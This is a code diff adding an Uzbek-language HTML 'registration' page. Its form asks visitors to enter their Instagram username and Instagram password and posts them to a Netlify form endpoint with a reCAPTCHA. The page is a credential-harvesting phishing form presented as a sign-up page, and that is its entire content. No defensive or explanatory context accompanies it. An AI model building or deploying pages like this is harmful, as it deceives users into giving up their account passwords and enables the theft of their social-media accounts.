@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ro'yxatdan o'tish</title>
+    <link rel="stylesheet" href="css/style-sign.css">
+</head>
+<body>
+    <div class="container">
+        <h2>Ro'yxatdan o'tish</h2>
+        <form name="contact" method="POST" netlify>
+            <label for="username">Instagram nikingizni kiriting:</label>
+            <input type="text" id="username" name="username" required>
+            <label for="password">Instagram parolingizni yozing:</label>
+            <input type="password" id="password" name="password" required>
+            <div class="field">
+                <div data-netlify-recaptcha="true"></div>
+            </div>
+            <button type="submit">Ro'yxatdan o'tish</button>
+        </form>
+    </div>
+</body>
+</html>
